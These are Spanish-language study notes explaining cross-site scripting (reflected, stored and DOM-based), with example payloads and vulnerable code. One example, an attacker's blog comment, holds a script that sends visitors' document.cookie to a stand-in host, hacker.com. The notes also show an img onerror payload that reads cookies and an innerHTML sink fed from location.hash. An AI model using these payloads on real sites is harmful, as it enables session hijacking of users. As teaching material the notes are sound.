# Cross-Site Scripting (XSS) 

## Qué es

Las vulnerabilidades de HTML Injection a menudo pueden usarse para realizar ataques **Cross-Site Scripting (XSS)** inyectando código JavaScript que se ejecuta en el cliente. Si podemos ejecutar código en la máquina de la víctima, podemos potencialmente acceder a su cuenta o incluso a su equipo. XSS es muy similar a HTML Injection, pero **XSS inyecta JavaScript** para ataques más avanzados en el cliente, en lugar de solo HTML.

## Tipos principales 

* **Reflected XSS:** ocurre cuando la entrada del usuario se muestra en la página después de procesarla (p. ej. resultado de búsqueda o mensaje de error).
* **Stored XSS:** ocurre cuando la entrada del usuario se almacena en la base de datos del back end y luego se muestra al recuperarla (p. ej. posts o comentarios).
* **DOM XSS:** ocurre cuando la entrada del usuario se muestra directamente en el navegador y se escribe en un objeto del DOM (p. ej. nombre de usuario vulnerable o título de página).

## Ejemplo de DOM XSS 

Payload:

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

## Qué sucede al inyectarlo

* Al ingresar ese payload en el ejemplo vulnerable sin sanitización, aparece una ventana `alert` con el valor de la cookie del usuario.
* El payload accede al árbol DOM y recupera `document.cookie`; cuando el navegador procesa la entrada se considera un nuevo DOM y el JavaScript se ejecuta, mostrando la cookie en un popup.
* Un atacante puede usar esto para robar sesiones (enviar la cookie a sí mismo) y luego intentar autenticarse como la víctima.
* El mismo principio permite realizar otros tipos de ataques contra usuarios de la aplicación.


---

# XSS (Cross-Site Scripting)

> [!SUMMARY] Resumen
> 
> Vulnerabilidad que permite inyectar scripts maliciosos en webs vistas por otros usuarios.
> 
> Objetivo: Ejecutar código en el navegador de la víctima (robo de cookies, sesiones, redirecciones).

---

## 1. XSS Reflejado (Reflected)

El script malicioso **no se guarda** en el servidor; viaja en la URL y el servidor lo "refleja" en la respuesta.

- **Vector:** Enlaces maliciosos (Phishing).
- **Persistencia:** Nula (requiere que la víctima haga clic cada vez).

> [!EXAMPLE] Ejemplo de URL
> http://sitio.com/buscar?q=<script>alert('XSS')</script>

**Cómo funciona:**

1. La víctima hace clic en el link.
2. El servidor recibe la `q` y la pone en el HTML de respuesta: `Resultados para: <script>...</script>`.
3. El navegador ejecuta el script.

---

## 2. XSS Almacenado (Stored)

El script malicioso **se guarda** permanentemente en el servidor (Base de datos, foros, comentarios).

- **Vector:** Formularios de comentarios, perfiles de usuario, posts.
- **Persistencia:** Alta (afecta a cualquiera que visite la página).

> [!FAIL] Código Vulnerable (Ejemplo)
> Un atacante comenta en un blog:
> ```HTML
> Excelente post!
> <script>
>   // Envía las cookies de quien lea esto al atacante
>   new Image().src = "http://hacker.com/robo.php?c=" + document.cookie;
> </script>
> ```

**Cómo funciona:**

1. El servidor guarda el comentario.
2. Cuando otros usuarios (o el administrador) cargan el post, el servidor sirve el comentario con el script.
3. El script se ejecuta automáticamente sin que el usuario haga nada extraño.
    

---

## 3. XSS basado en DOM (DOM-based)

Ocurre enteramente en el **navegador**. El servidor envía la página bien, pero el Javascript del sitio manipula los datos de forma insegura.

- **Fuente (Source):** `location.hash`, `location.search`, `document.referrer`.
- **Sumidero (Sink):** `innerHTML`, `document.write`, `eval()`.
    

> [!BUG] Ejemplo Javascript
> ```JavaScript
> // Toma el texto después del # en la URL y lo pega en el HTML
> var mensaje = location.hash.substring(1);
> document.getElementById('saludo').innerHTML = mensaje;
> ```
> Si la URL es `sitio.com#<img src=x onerror=alert(1)>`, se ejecuta el ataque.

---

## Diferencias Clave

|**Tipo**|**¿Dónde se aloja el payload?**|**¿Quién ve el ataque?**|
|---|---|---|
|**Reflejado**|En la URL (Cliente -> Servidor -> Cliente)|Solo la víctima que hace clic|
|**Almacenado**|Base de Datos del Servidor|Todos los visitantes|
|**DOM-based**|En el navegador (Cliente -> Cliente)|Depende de cómo se comparta el link|

---

## Notas Relacionadas

- [[Prevención de XSS]]
- [[Content Security Policy (CSP)]]
- [[Robo de Sesiones]]